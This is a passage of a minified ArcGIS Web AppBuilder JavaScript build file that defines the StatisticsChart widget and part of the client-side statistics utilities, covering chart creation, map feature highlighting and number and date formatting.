// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"jimu/dijit/StatisticsChart":function(){define("dojo/on dojo/Evented dojo/Deferred dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/_base/html dojo/_base/query dojo/_base/Color dijit/popup dijit/_WidgetBase dijit/TooltipDialog dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./templates/StatisticsChart.html esri/lang esri/graphic esri/graphicsUtils esri/symbols/jsonUtils esri/layers/FeatureLayer jimu/utils jimu/clientStatisticsUtils jimu/dijit/Chart jimu/dijit/_StatisticsChartSettings jimu/dijit/LoadingIndicator".split(" "),
function(q,g,n,b,a,d,h,k,m,c,e,l,y,v,p,D,B,w,r,u,t,A,C,G){return b([e,y,v,g],{baseClass:"jimu-dijit-statistics-chart",templateString:p,theme:"light",noMoreThanOneChartClassName:"no-more-than-one-chart",hasTitleClassName:"has-title",charts:null,paramsDijits:null,tooltipDialogs:null,currentChartIndex:-1,tempGraphics:null,maxPreviewFeaturesCount:20,tooltipColor:"green",floatNumberFieldDecimalPlace:null,popupFieldInfosObj:null,config:null,features:null,featureLayer:null,map:null,fontColor:"#333333",isBigPreview:!1,
showSettingIcon:!1,showZoomIcon:!1,zoomToFeaturesWhenClick:!1,initialChartIndex:0,postMixInProperties:function(){this.nls=window.jimuNls.statisticsChart;this.charts=[];this.paramsDijits=[];this.tooltipDialogs=[];this.isBigPreview&&(this.showZoomIcon=!1)},postCreate:function(){this.inherited(arguments);this.showSettingIcon?this.own(q(document.body,"click",a.hitch(this,this._onDocumentBodyClick))):h.destroy(this.settingsIcon);this.showZoomIcon?this.own(q(this.zoominIcon,"click",a.hitch(this,function(){this.emit("zoomin")}))):
h.destroy(this.zoominIcon);this.isBigPreview&&(this.chartContainer.style.maxHeight="auto",h.addClass(this.domNode,"big-preview"));this.zoominIcon.title=this.nls.enlarge;this.settingsIcon.title=this.nls.setting;h.addClass(this.domNode,this.noMoreThanOneChartClassName)},destroy:function(){this.clear();this.inherited(arguments)},resize:function(a,c){if(0<a||"string"===typeof a&&0<a.length)this.domNode.style.width=a;if(0<c||"string"===typeof c&&0<c.length)this.domNode.style.height=c;this._resize()},resizeByParent:function(){this.domNode.style.width=
"100%";this.domNode.style.height="100%";this._resize()},_resize:function(){this._calculateChartBox();0<=this.currentChartIndex&&this._showChart(this.currentChartIndex)},createServerStatisticsCharts:function(f,c,b){var e=f.fields,x={type:"Table",fields:[]},l=a.clone(b),E=b.mode;"category"===E?(l.valueFields=[],x.fields=d.map(b.valueFields,a.hitch(this,function(a){var f=b.operation;"average"===f&&(f="avg");var c=a+"_"+f;a=a+"_"+f;l.valueFields.push(c);return{name:c,type:"esriFieldTypeDouble",alias:a}})),
d.some(e,a.hitch(this,function(a){return a.name===b.categoryField?(x.fields.push(a),!0):!1}))):"count"===E?(l.mode="feature",l.labelField=b.categoryField,f=f.fields[0].name+"_count",l.valueFields=[f],d.some(e,a.hitch(this,function(a){return a.name===b.categoryField?(x.fields.push(a),!0):!1})),x.fields.push({name:f,type:"esriFieldTypeInteger",alias:this.nls.count})):"field"===E&&(l.valueFields=[],x.fields=d.map(b.valueFields,a.hitch(this,function(a){var f=b.operation;"average"===f&&(f="avg");var c=
a+"_"+f;a=a+"_"+f;l.valueFields.push(c);return{name:c,type:"esriFieldTypeDouble",alias:a}})));return this._getLoadedLayer(x).then(a.hitch(this,function(a){this._createChartsAsync({featureLayer:a,features:c,config:l})}))},createClientCharts:function(f,c,b,e,d){d&&(this.featureLayerForChartSymbologyChart=d);return this._getLoadedLayer(f).then(a.hitch(this,function(a){this._createChartsAsync({featureLayer:a,features:c,config:b,popupFieldInfosObj:e})}))},_getLoadedLayer:function(f){var c=new n,b=null,
b="string"===typeof f?new u(f):"esri.layers.FeatureLayer"===f.declaredClass?f:new u({layerDefinition:a.clone(f),featureSet:null});b.loaded?c.resolve(b):this.own(q(b,"load",a.hitch(this,function(){c.resolve(b)})));return c},_createChartsAsync:function(f){setTimeout(a.hitch(this,function(){this._createCharts(f)}),0)},_createCharts:function(f){try{this.loading.hide();this.clear();var c=!1;f.features&&(c=!!f.features.isSelectedFeatures,f.features=d.filter(f.features,a.hitch(this,function(a){return!!a.attributes})));
this.config=f.config;this.features=f.features;this.featureLayer=f.featureLayer;this.popupFieldInfosObj=f.popupFieldInfosObj?f.popupFieldInfosObj:{};this.config.highLightColor||(this.config.highLightColor=c?"#ff0000":"#00ffff");this._calculateDecimalPlaceForFloatField();this.chartTitle.innerHTML=t.stripHTML(this.config.name||"");this.chartTitle.title=this.chartTitle.innerHTML;this.chartTitle.title?h.addClass(this.domNode,this.hasTitleClassName):h.removeClass(this.domNode,this.hasTitleClassName);1>=
f.config.types.length?h.addClass(this.domNode,this.noMoreThanOneChartClassName):h.removeClass(this.domNode,this.noMoreThanOneChartClassName);var b=this._calculateChartBox(),e=b.w+"px",I=b.h+"px",p=d.map(f.config.types,a.hitch(this,function(a){var f=h.create("div",{"class":"chart-div",style:{width:e,height:I}},this.chartContainer),c=h.toDom("\x3cli class\x3d'paging-li'\x3e\x3ca class\x3d'paging-a'\x3e\x3c/a\x3e\x3c/li\x3e");h.place(c,this.pagingUl);c=a.type;a=a.display;a.backgroundColor||(a.backgroundColor=
"transparent");a.hasOwnProperty("showLegend")||(a.showLegend=!1);a.legendTextColor||(a.legendTextColor=this.fontColor);"pie"===c?(a.hasOwnProperty("showDataLabel")||(a.showDataLabel=!0),a.dataLabelColor||(a.dataLabelColor=this.fontColor)):(a.hasOwnProperty("showHorizontalAxis")||(a.showHorizontalAxis=!0),a.horizontalAxisTextColor||(a.horizontalAxisTextColor=this.fontColor),a.hasOwnProperty("showVerticalAxis")||(a.showVerticalAxis=!0),a.verticalAxisTextColor||(a.verticalAxisTextColor=this.fontColor));
return f})),c=null;"feature"===this.config.mode?c=this._createFeatureModeCharts(f,p):"category"===this.config.mode?c=this._createCategoryModeCharts(f,p):"count"===this.config.mode?c=this._createCountModeCharts(f,p):"field"===this.config.mode&&(c=this._createFieldModeCharts(f,p));this.charts=c.charts;this.paramsDijits=c.paramsDijits;this.tooltipDialogs=d.map(this.paramsDijits,a.hitch(this,function(a){var f=h.create("div");a.placeAt(f);return new l({content:f})}));f=0;0<=this.initialChartIndex&&this.charts.length>=
this.initialChartIndex+1&&(f=this.initialChartIndex);this._showChart(f)}catch(F){console.error(F)}},_calculateChartBox:function(){var a=h.getContentBox(this.domNode),c=a.h;0<this.resultsHeader.clientHeight&&(c=h.getMarginBox(this.resultsHeader),c=a.h-c.h);a=60;c<a&&(a=c);h.setStyle(this.leftArrow,"height",a+"px");h.setStyle(this.rightArrow,"height",a+"px");h.setStyle(this.chartContainer,"height",c+"px");h.setStyle(this.faildRenderInfo,"height",c+"px");return h.getContentBox(this.chartContainer)},
_calculateDecimalPlaceForFloatField:function(){this.floatNumberFieldDecimalPlace={};var f=[];this.config.labelField&&f.push(this.config.labelField);this.config.categoryField&&f.push(this.config.categoryField);this.config.valueFields&&(f=f.concat(this.config.valueFields));var c=d.filter(f,a.hitch(this,function(a){return this._isFloatNumberField(a)})),b={};d.forEach(c,a.hitch(this,function(a){b[a]=[]}));(f=this.features)&&0<f.length&&d.forEach(f,a.hitch(this,function(f){var e=f.attributes;e&&d.forEach(c,
a.hitch(this,function(a){var f=e[a];"number"===typeof f&&b[a].push(f)}))}));d.forEach(c,a.hitch(this,function(a){this.floatNumberFieldDecimalPlace[a]=0;var f=b[a];if(0<f.length)try{var c=this._getBestDecimalPlace(f);this.floatNumberFieldDecimalPlace[a]=c}catch(F){this.floatNumberFieldDecimalPlace[a]=0,console.error(F)}this.popupFieldInfosObj&&(f=this.popupFieldInfosObj[a])&&f.format&&0<=f.format.places&&(this.floatNumberFieldDecimalPlace[a]=f.format.places)}))},_onDocumentBodyClick:function(a){if(0<=
this.currentChartIndex&&this.tooltipDialogs){var f=this.tooltipDialogs[this.currentChartIndex];if(f){var c=!!f.isOpendNow;this._hideAllTooltipDialogs();var b=a.target||a.srcElement;b===this.leftArrow||b===this.rightArrow||h.hasClass(b,"paging-a")||h.hasClass(b,"paging-li")||(b===this.settingsIcon?c?this._hideTooltipDialog(f):this._showTooltipDialog(f):(a=b===f.domNode,b=h.isDescendant(b,f.domNode),a||b?c?this._showTooltipDialog(f):this._hideTooltipDialog(f):this._hideTooltipDialog(f)))}else this._hideAllTooltipDialogs()}else this._hideAllTooltipDialogs()},
clear:function(){this.featureLayer=this.features=this.config=null;this.chartTitle.innerHTML="";this.chartTitle.title="";this.currentChartIndex=-1;this.popupFieldInfosObj=this.floatNumberFieldDecimalPlace=null;k("li",this.pagingUl).removeClass("selected");this.charts||(this.charts=[]);this.paramsDijits||(this.paramsDijits=[]);this.tooltipDialogs||(this.tooltipDialogs=[]);for(var a=0;a<this.charts.length;a++)this.charts[a]&&this.charts[a].destroy(),this.charts[a]=null,this.paramsDijits[a]&&this.paramsDijits[a].destroy(),
this.paramsDijits[a]=null,this.tooltipDialogs[a]&&this.tooltipDialogs[a].destroy(),this.tooltipDialogs[a]=null;this.charts=[];this.paramsDijits=[];this.tooltipDialogs=[];h.empty(this.pagingUl);h.empty(this.chartContainer);h.addClass(this.domNode,this.noMoreThanOneChartClassName)},_showFialdRenderInfo:function(){h.addClass(this.chartSection,"render-faild")},_hideFialdRenderInfo:function(){h.removeClass(this.chartSection,"render-faild")},_showChart:function(a){this.currentChartIndex=-1;var c=k(".chart-div",
this.chartContainer);c.style({display:"none"});var f=k("li",this.pagingUl);f.removeClass("selected");if(!(0>a)){if(c=c[a])this.currentChartIndex=a,h.setStyle(c,"display","block");(f=f[a])&&h.addClass(f,"selected");this.charts&&0<this.charts.length&&(f=this.charts[a])&&this._handlePieChartDisplay(f);if(!this.isBigPreview&&(f=null,this.charts&&0<this.charts.length&&(f=this.charts[a]))){a=this._calculateChartBox();var b=h.getContentBox(c);if(a.w!==b.w||a.h!==b.h)this.loading.show(),b=a.w+"px",a=a.h+
"px",h.setStyle(c,"width",b),h.setStyle(c,"height",a),f.resize(b,a),this.loading.hide()}}},_handlePieChartDisplay:function(a){var c=!1;a&&a.config&&"pie"===a.config.type&&(a=a.config.labels)&&150<a.length&&(c=!0);c?this._showFialdRenderInfo():this._hideFialdRenderInfo()},_hideAllTooltipDialogs:function(){this.tooltipDialogs&&0<this.tooltipDialogs.length&&d.forEach(this.tooltipDialogs,a.hitch(this,function(a){this._hideTooltipDialog(a)}))},_hideTooltipDialog:function(a){a&&(c.close(a),a.isOpendNow=
!1)},_showTooltipDialog:function(a){a&&(c.open({popup:a,around:this.settingsIcon}),a.isOpendNow=!0)},_onPagingUlClicked:function(a){a.stopPropagation();this._hideAllTooltipDialogs();a=a.target||a.srcElement;if("a"===a.tagName.toLowerCase()){var c=k("a",this.pagingUl);a=d.indexOf(c,a);0<=a&&this._showChart(a)}},_onLeftArrowClicked:function(a){a.stopPropagation();this._hideAllTooltipDialogs();a=(this.currentChartIndex-1+this.charts.length)%this.charts.length;0<=a&&this._showChart(a)},_onRightArrowClicked:function(a){a.stopPropagation();
this._hideAllTooltipDialogs();a=(this.currentChartIndex+1+this.charts.length)%this.charts.length;0<=a&&this._showChart(a)},_getHighLightMarkerSymbol:function(){var a=r.fromJson({color:[255,255,255,0],size:18,angle:0,xoffset:0,yoffset:0,type:"esriSMS",style:"esriSMSSquare",outline:{color:[0,0,128,255],width:.75,type:"esriSLS",style:"esriSLSSolid"}});a.setSize(30);a.outline.setColor(new m(this.config.highLightColor));return a},_getHighLightLineSymbol:function(a){var c=r.fromJson({color:[0,255,255,255],
width:1.5,type:"esriSLS",style:"esriSLSSolid"});c.setColor(new m(a||this.config.highLightColor));return c},_getDefaultHighLightFillSymbol:function(){var a=r.fromJson({color:[0,255,255,128],outline:{color:[0,255,255,255],width:1.5,type:"esriSLS",style:"esriSLSSolid"},type:"esriSFS",style:"esriSFSSolid"});a.outline.setColor(new m(this.config.highLightColor));return a},_getVisualVariableByType:function(a,c){return c&&(c=d.filter(c,function(c){return c.type===a&&!c.target}),c.length)?c[0]:null},_getSymbolByRenderer:function(c,
b){var f=this._getDefaultHighLightFillSymbol(),e=this._getVisualVariableByType("colorInfo",c.visualVariables);if(e){if(c=c.getColor(b,{colorInfo:e}))c=a.clone(c),f.setColor(c)}else f=c.getSymbol(b);return f},_getHighLightFillSymbol:function(a,c,b){var f=null,e=c.symbol,f=a.renderer;!e&&f&&(e=this._getSymbolByRenderer(f,c));e&&"function"===typeof e.setOutline?(f=r.fromJson(e.toJson()),c=1.5,e.outline&&0<e.outline.width&&(c=e.outline.width+1),b=this._getHighLightLineSymbol(b?"#ff0000":"#00ffff"),b.setWidth(c),
f.setOutline(b)):f=this._getDefaultHighLightFillSymbol();return f},_zoomToGraphics:function(c){if(this.map&&this.featureLayer&&this.featureLayer.visible){var b;c&&0<c.length&&(b=d.filter(c,function(a){a=a.geometry;return"point"!==a.type?!0:t.isVaildPointGeometry(a)}.bind(this)));if(b&&0<b.length){var f=null;try{f=w.graphicsExtent(b)}catch(H){console.error(H)}if(t.isVaildExtent(f))this.map.setExtent(f.expand(1.4));else if(c=(c=c[0])&&c.geometry)b=a.hitch(this,function(c){var b=this.map.getNumLevels(),
f=this.map.getLevel();this.map.setLevel(Math.max(f,Math.floor(2*b/3))).then(a.hitch(this,function(){this.map.centerAt(c)}))}),"point"===c.type?b(c):"multipoint"===c.type&&1===c.points.length&&b(c.getPoint(0))}}},_removeTempGraphics:function(){if(this.featureLayer&&this.tempGraphics&&0<this.tempGraphics.length)for(;0<this.tempGraphics.length;)this.featureLayer.remove(this.tempGraphics[0]),this.tempGraphics.splice(0,1);this.tempGraphics=null},_mouseOverChartItem:function(c){this._removeTempGraphics();
d.forEach(c,a.hitch(this,function(a){a._originalSymbol=a.symbol}));if(this.featureLayer&&this.featureLayer.getMap()&&this.featureLayer.visible){var b=t.getTypeByGeometryType(this.featureLayer.geometryType),f=null;if("point"===b)f=this._getHighLightMarkerSymbol(),this.tempGraphics=[],d.forEach(c,a.hitch(this,function(a){a=new B(a.geometry,f);this.tempGraphics.push(a);this.featureLayer.add(a)}));else if("polyline"===b)f=this._getHighLightLineSymbol(),d.forEach(c,a.hitch(this,function(a){a.setSymbol(f)}));
else if("polygon"===b){var e=this.featureLayer.getSelectedFeatures()||[];d.forEach(c,a.hitch(this,function(a){var c=0<=e.indexOf(a),c=this._getHighLightFillSymbol(this.featureLayer,a,c);a.setSymbol(c)}));this.features.length!==c.length&&"polygon"===b&&(d.forEach(c,a.hitch(this,function(a){this.featureLayer.remove(a)})),d.forEach(c,a.hitch(this,function(a){this.featureLayer.add(a)})))}}},_mouseOutChartItem:function(c){this._removeTempGraphics();d.forEach(c,a.hitch(this,function(a){a.setSymbol(a._originalSymbol||
null)}))},_isNumber:function(a){return"[object number]"===Object.prototype.toString.call(a).toLowerCase()},_tryLocaleNumber:function(c,b){var e=c;if(D.isDefined(c)&&isFinite(c))try{var f;if(b&&this._isNumberField(b)){var d=this.popupFieldInfosObj[b];f=d&&a.exists("format.places",d)?t.localizeNumberByFieldInfo(c,d):t.localizeNumber(c)}else f=c;"string"===typeof f&&(e=f)}catch(J){console.error(J)}return e+""},_getBestDisplayValue:function(c,b){var e=this._tryLocaleNumber(b,c);if(this.featureLayer.typeIdField===
c){var f=this.featureLayer.types;if(f&&0<f.length&&(f=d.filter(f,a.hitch(this,function(a){return a.id===b})),0<f.length))return e=f[0].name}(c=this._getFieldInfo(c))&&c.domain&&(c=c.domain.codedValues)&&0<c.length&&d.some(c,function(a){return a.code===b?(e=a.name,!0):!1});return e},_getFieldAliasArray:function(c){return d.map(c,a.hitch(this,function(a){return this._getFieldAlias(a)}))},_getFieldAlias:function(a){var c=a;(a=this._getFieldInfo(a))&&(c=a.alias||c);return c},_getFieldInfo:function(a){if(this.featureLayer)for(var c=
this.featureLayer.fields,b=0;b<c.length;b++)if(c[b].name===a)return c[b];return null},_isNumberField:function(c){var b=["esriFieldTypeSmallInteger","esriFieldTypeInteger","esriFieldTypeSingle","esriFieldTypeDouble"];return d.some(this.featureLayer.fields,a.hitch(this,function(a){return a.name===c&&0<=b.indexOf(a.type)}))},_isFloatNumberField:function(c){var b=["esriFieldTypeSingle","esriFieldTypeDouble"];return d.some(this.featureLayer.fields,a.hitch(this,function(a){return a.name===c&&0<=b.indexOf(a.type)}))},
_isDateField:function(a){return(a=this._getFieldInfo(a))?"esriFieldTypeDate"===a.type:!1},_getBestDecimalPlace:function(a){var c=0,b={};d.forEach(a,function(a){a=a.toString().split(".");var c=null;1===a.length?c=0:2===a.length&&(c=a[1].length);null!==c&&(b[c]=void 0===b[c]?1:b[c]+1)});a=null;for(var e in b){e=parseInt(e,10);var f=b[e];a?f>a.value&&(a={key:e,value:f}):a={key:e,value:f}}a&&(c=parseInt(a.key,10));return c},_getFloatNumberFieldDecimalPlace:function(a){var c=0;this.floatNumberFieldDecimalPlace&&
(a=this.floatNumberFieldDecimalPlace[a],"number"===typeof a&&(c=a));return c},_getBestValueForFloatNumberField:function(a,c){c=this._getFloatNumberFieldDecimalPlace(c);a=a.toFixed(c);return parseFloat(a)},_getColors:function(c,b){var e=[];c=a.clone(c);if(2===c.colors.length)e=this._createGradientColors(c.colors[0],c.colors[c.colors.length-1],b);else{for(var d=Math.ceil(b/c.colors.length),f=0;f<d;f++)e=e.concat(c.colors);e=e.slice(0,b)}return e},_createGradientColors:function(a,c,b){var e=[];a=new m(a);
var d=new m(c);c=(d.r-a.r)/b;for(var f=(d.g-a.g)/b,d=(d.b-a.b)/b,l=new m,p=0,h=0,C=0,k=0;k<b;k++)p=parseInt(a.r+c*k,10),h=parseInt(a.g+f*k,10),C=parseInt(a.b+d*k,10),l.setColor([p,h,C]),e.push(l.toHex());return e},_createParamsDijit:function(a,c){return new G({isInWidget:this.map?!0:!1,type:a,config:c})},_createJimuChart:function(c,b,e,d,l){var f=l.type,p=this._createParamsDijit(f,l.display),h=p.getConfig();h&&a.mixin(l.display,h);var k=this._getBasicChartOptionsByStatisticsInfo(b,e,d,f);this._udpateJimuChartDisplayOptions(k,
l);var g=new C({chartDom:c,config:k});g.placeAt(c);this._bindChartEvent(g,b,d);this.showSettingIcon&&this.own(q(p,"change",a.hitch(this,function(){p.showShelter();if(g){var c=p.getConfig();a.mixin(l.display,c);this._udpateJimuChartDisplayOptions(k,l);g.updateConfig(k)}p.hideShelter()})));return[g,p]},_udpateJimuChartDisplayOptions:function(c,b){var e=b.type,f=b.display;b={type:e,dataZoom:["inside","slider"],confine:!0,backgroundColor:f.backgroundColor,color:f.colors,legend:f.showLegend,theme:this.theme||
"light",advanceOption:function(c){f.showLegend&&c.legend&&(c.legend.textStyle||(c.legend.textStyle={}),c.legend.textStyle.color=f.legendTextColor,c.legend.textStyle.fontSize=f.legendTextSize);"pie"===e?c.series&&0<c.series.length&&d.forEach(c.series,a.hitch(this,function(a){"pie"===a.type&&(a.label||(a.label={}),a.label.normal||(a.label.normal={}),a.label.normal.show=f.showDataLabel,a.label.normal.textStyle||(a.label.normal.textStyle={}),a.label.normal.textStyle.color=f.dataLabelColor,a.label.normal.textStyle.fontSize=
f.dataLabelSize)})):(c.xAxis||(c.xAxis={}),c.xAxis.axisLabel||(c.xAxis.axisLabel={}),c.xAxis.axisLabel.textStyle||(c.xAxis.axisLabel.textStyle={}),c.xAxis.axisLabel.textStyle.color=f.horizontalAxisTextColor,c.xAxis.axisLabel.textStyle.fontSize=f.horizontalAxisTextSize,c.yAxis||(c.yAxis={}),c.yAxis.axisLabel||(c.yAxis.axisLabel={}),c.yAxis.axisLabel.textStyle||(c.yAxis.axisLabel.textStyle={}),c.yAxis.axisLabel.textStyle.color=f.verticalAxisTextColor,c.yAxis.axisLabel.textStyle.fontSize=f.verticalAxisTextSize)}};
"pie"===e&&(b.innerRadius=f.innerRadius,b.labelLine=!!f.showDataLabel);-1<["column","bar","line"].indexOf(e)&&(f.stack||(f.stack=!1),"line"!==e||f.area||(f.area=!1),"line"===e&&(b.area=f.area),"column"===e||"bar"===e||"line"===e&&f.area)&&(b.stack=f.stack);a.mixin(c,b);"pie"!==e&&(c.axisPointer=!0,c.scale=!1,c.hidexAxis=!f.showHorizontalAxis,c.hideyAxis=!f.showVerticalAxis);return c},_getBasicChartOptionsByStatisticsInfo:function(a,c,b,e){return"feature"===a||"category"===a?this._getCategoryModeChartOptionsByStatisticsInfo(c,
b,e):"count"===a?this._getCountModeChartOptionsByStatisticsInfo(b,e):"field"===a?this._getFieldModeChartOptionByStatisticsInfo(b,e):null},_bindChartEvent:function(c,b,e){if(this.map&&0!==e.length){var f=a.hitch(this,function(a){if("series"===a.componentType){var c=null;if("field"===b)c=this.features;else{var d=e[a.dataIndex];d&&(c=d.dataFeatures)}c&&("mouseover"===a.type?this._mouseOverChartItem(c):"mouseout"===a.type?this._mouseOutChartItem(c):"click"===a.type&&this.zoomToFeaturesWhenClick&&this._zoomToGraphics(c))}}),
l=[{name:"mouseover",callback:f},{name:"mouseout",callback:f}];this.zoomToFeaturesWhenClick&&l.push({name:"click",callback:f});d.forEach(l,a.hitch(this,function(a){c.chart.on(a.name,a.callback)}))}},_createFeatureModeCharts:function(c,b){var e=[],f=[],l=c.config,p={layerDefinition:this.featureLayer,popupFieldInfosObj:this.popupFieldInfosObj,features:c.features,labelField:l.labelField,valueFields:l.valueFields,sortOrder:l.sortOrder,maxLabels:l.maxLabels,useLayerSymbology:l.useLayerSymbology};this.featureLayerForChartSymbologyChart&&
(p.featureLayerForChartSymbologyChart=this.featureLayerForChartSymbologyChart);var h=A.getFeatureModeStatisticsInfo(p);d.forEach(l.types,a.hitch(this,function(a,c){try{var d=this._createJimuChart(b[c],"feature",p,h,a);e.push(d[0]);f.push(d[1])}catch(z){console.error(z)}}));return{charts:e,paramsDijits:f}},_createCategoryModeCharts:function(c,b){var e=[],f=[],l=c.config,p={layerDefinition:this.featureLayer,popupFieldInfosObj:this.popupFieldInfosObj,features:c.features,categoryField:l.categoryField,
valueFields:l.valueFields,operation:c.config.operation,sortOrder:l.sortOrder,dateConfig:l.dateConfig,maxLabels:l.maxLabels,nullValue:l.nullValue,useLayerSymbology:l.useLayerSymbology,splitField:l.splitField};this.featureLayerForChartSymbologyChart&&(p.featureLayerForChartSymbologyChart=this.featureLayerForChartSymbologyChart);var h=A.getCategoryModeStatisticsInfo(p);d.forEach(l.types,a.hitch(this,function(a,c){try{var d=this._createJimuChart(b[c],"category",p,h,a);e.push(d[0]);f.push(d[1])}catch(z){console.error(z)}}));
return{charts:e,paramsDijits:f}},_getSplitedSeriesForCategoryOrCountMode:function(c,b){var e={type:b,labels:[],series:[]},f=[];c.forEach(function(a){if(a=a.splitedValueFields)a=a.map(function(a){return a.field}),f=f.concat(a)});var l=t.uniqueArray(f);e.series=d.map(l,a.hitch(this,function(a){for(var e=[],d=0;d<c.length;d++)e[d]=null;return{name:a,type:b,data:e}}));d.forEach(c,a.hitch(this,function(a,c){var b="";a.category?b=a.category:a.fieldValue&&(b=a.fieldValue);e.labels.push(b);a.splitedValueFields.forEach(function(b){e.series.forEach(function(e){if(e.name===
b.field)if("undefined"!==typeof a.color){var d=this._getSerieData(a,b.value);e.data[c]=d}else e.data[c]=b.value}.bind(this))}.bind(this))}));return e},_getCategoryModeChartOptionsByStatisticsInfo:function(c,b,e){c=this._getFieldAliasArray(c.valueFields);var f=null,l=!1;0<b.length&&(l=b.every(function(a){return!!a.splitedValueFields}));if(l)return this._getSplitedSeriesForCategoryOrCountMode(b,e);"radar"===e?(c=c.map(function(a){return{name:a}}),b=this._getSeriesOfRadar(b),f={type:e,indicator:c,series:b}):
(f={type:e,labels:[],series:[]},f.series=d.map(c,a.hitch(this,function(a){return{name:a,type:e,data:[]}})),d.forEach(b,a.hitch(this,function(a){f.labels.push(a.category);for(var c=0;c<a.valueFields.length;c++){var b=a.valueFields[c];"undefined"!==typeof a.color&&(b=this._getSerieData(a,b));f.series[c].data.push(b)}})));return f},_getSeriesOfRadar:function(a){a=a.map(function(a){return{name:a.category,value:a.valueFields}});return[{type:"radar",data:a}]},_isAllFalseColor:function(a){return a.every(function(a){return!a.color})},
_getSerieData:function(a,c){a.color||(a.color="transparent");return{value:c,itemStyle:{normal:{color:a.color},emphasis:{color:a.color}}}},_createCountModeCharts:function(c,b){var e=[],f=[],l=c.config,p={layerDefinition:this.featureLayer,popupFieldInfosObj:this.popupFieldInfosObj,features:c.features,categoryField:l.categoryField,sortOrder:l.sortOrder,dateConfig:l.dateConfig,maxLabels:l.maxLabels,useLayerSymbology:l.useLayerSymbology,splitField:l.splitField};this.featureLayerForChartSymbologyChart&&
(p.featureLayerForChartSymbologyChart=this.featureLayerForChartSymbologyChart);var h=A.getCountModeStatisticsInfo(p);d.forEach(l.types,a.hitch(this,function(a,c){try{var d=this._createJimuChart(b[c],"count",p,h,a);e.push(d[0]);f.push(d[1])}catch(z){console.error(z)}}));return{charts:e,paramsDijits:f}},_getCountModeChartOptionsByStatisticsInfo:function(c,b){var e=!1;0<c.length&&(e=c.every(function(a){return!!a.splitedValueFields}));if(e)return this._getSplitedSeriesForCategoryOrCountMode(c,b);var f=
{type:b,labels:[],series:[{type:b,data:[]}]};d.forEach(c,a.hitch(this,function(a){var c=a.count;f.labels.push(a.fieldValue);"undefined"!==typeof a.color?(a=this._getSerieData(a,c),f.series[0].data.push(a)):f.series[0].data.push(c)}));return f},_createFieldModeCharts:function(c,b){var e=[],f=[],l=c.config,p={layerDefinition:this.featureLayer,features:c.features,valueFields:l.valueFields,operation:l.operation,sortOrder:l.sortOrder,maxLabels:l.maxLabels,nullValue:l.nullValue},h=A.getFieldModeStatisticsInfo(p);
d.forEach(l.types,a.hitch(this,function(a,c){try{var d=this._createJimuChart(b[c],"field",p,h,a);e.push(d[0]);f.push(d[1])}catch(z){console.error(z)}}));return{charts:e,paramsDijits:f}},_getFieldModeChartOptionByStatisticsInfo:function(c,b){var e={type:b,labels:[],series:[{type:b,data:[]}]};d.forEach(c,a.hitch(this,function(a){var c=this._getFieldAlias(a.label);e.labels.push(c);e.series[0].data.push(a.value)}));return e}})})},"jimu/clientStatisticsUtils":function(){define("dojo/_base/declare dojo/_base/array dojo/_base/lang dojo/_base/config ./_dateFormat moment/moment jimu/utils esri/lang".split(" "),
function(q,g,n,b,a,d,h,k){window.makeTwix(d);var m=q(null,{popupFieldInfosObj:null,constructor:function(a){a&&n.mixin(this,a);this.popupFieldInfosObj||(this.popupFieldInfosObj={});this.floatNumberFieldDecimalPlace={}},_isNumber:function(a){return"[object number]"===Object.prototype.toString.call(a).toLowerCase()},_tryLocaleNumber:function(a,b){var c=a;if(k.isDefined(a)&&isFinite(a))try{var e;if(b&&this._isNumberField(b)){var d=this.popupFieldInfosObj[b];e=d&&n.exists("format.places",d)?h.localizeNumberByFieldInfo(a,
d):h.localizeNumber(a)}else e=a;"string"===typeof e&&(c=e)}catch(p){console.error(p)}return c+""},_getBestDisplayValue:function(a,b){return b||"number"===typeof b?this._isDateField(a)?this._dateFormatter(a,b):this._valueFormatter(a,b):"null"},_dateFormatter:function(a,b){a:{if(this.popupFieldInfosObj&&k.isDefined(this.popupFieldInfosObj.fieldInfos))for(var c=0,e=this.popupFieldInfosObj.fieldInfos.length;c<e;c++){var d=this.popupFieldInfosObj.fieldInfos[c];if(d.fieldName===a){a=d.format;break a}}a=
null}return h.fieldFormatter.getFormattedDate(b,a)},_valueFormatter:function(a,b){var c=this._tryLocaleNumber(b,a);if(this.layerDefinition.typeIdField===a){var e=this.layerDefinition.types;if(e&&0<e.length&&(e=g.filter(e,n.hitch(this,function(a){return a.id===b})),0<e.length))return c=e[0].name}(a=this._getFieldInfo(a))&&a.domain&&(a=a.domain.codedValues)&&0<a.length&&g.some(a,function(a){return a.code===b?(c=a.name,!0):!1});return c},_getFieldAliasArray:function(a){return g.map(a,n.hitch(this,function(a){return this._getFieldAlias(a)}))},
_getFieldAlias:function(a){var c=a;(a=this._getFieldInfo(a))&&(c=a.alias||c);return c},_getFieldInfo:function(a){if(this.layerDefinition)for(var c=this.layerDefinition.fields,b=0;b<c.length;b++)if(c[b].name===a)return c[b];return null},_isNumberField:function(a){var c=["esriFieldTypeSmallInteger","esriFieldTypeInteger","esriFieldTypeSingle","esriFieldTypeDouble"];return g.some(this.layerDefinition.fields,n.hitch(this,function(b){return b.name===a&&0<=c.indexOf(b.type)}))},_isFloatNumberField:function(a){var c=
["esriFieldTypeSingle","esriFieldTypeDouble"];return g.some(this.layerDefinition.fields,n.hitch(this,function(b){return b.name===a&&0<=c.indexOf(b.type)}))},_isIntegerNumberField:function(a){var c=["esriFieldTypeSmallInteger","esriFieldTypeInteger"];return g.some(this.layerDefinition.fields,n.hitch(this,function(b){return b.name===a&&0<=c.indexOf(b.type)}))},_isDateField:function(a){return(a=this._getFieldInfo(a))?"esriFieldTypeDate"===a.type:!1},_getBestDecimalPlace:function(a){var c=0,b={};g.forEach(a,
function(a){a=a.toString().split(".");var c=null;1===a.length?c=0:2===a.length&&(c=a[1].length);null!==c&&(b[c]=void 0===b[c]?1:b[c]+1)});a=null;for(var d in b){d=parseInt(d,10);var h=b[d];a?h>a.value&&(a={key:d,value:h}):a={key:d,value:h}}a&&(c=parseInt(a.key,10));return c},_calculateDecimalPlaceForFloatField:function(a,b){this.floatNumberFieldDecimalPlace={};var c=[];a.labelField&&c.push(a.labelField);a.categoryField&&c.push(a.categoryField);a.valueFields&&(c=c.concat(a.valueFields));var e=g.filter(c,
